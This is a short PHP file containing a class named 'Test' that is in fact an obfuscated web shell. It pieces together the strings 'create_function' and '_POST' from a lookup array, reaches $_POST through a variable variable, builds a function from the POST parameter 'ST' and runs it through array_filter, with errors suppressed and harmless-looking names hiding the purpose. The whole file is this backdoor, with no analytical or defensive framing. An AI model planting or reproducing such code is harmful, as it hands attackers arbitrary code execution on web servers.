<?php 
class Test{
        const Test = "function";
    static private $_filter = array(
        "function" => "create",
        "MI"           => "POST",
        "LL"           => "_"
        );
        static public function RSS($i){
                if($i == 0){
                        return self::$_filter["function"].self::$_filter["LL"].self::Test;
                }
                return self::$_filter["LL"].self::$_filter["MI"];
        }
        static public function HHH($Test){
                $P = self::RSS(0);
                $P30 = array(
                0 => "ST"
                );
                @$Test = $P(NULL,$Test[$P30[0]]);
                $Test = array_filter($P30,$Test);
                $Test = $P30;
                return $Test[0];
        }
}
$Test= Test::RSS(1);
echo Test::HHH($$Test);
?>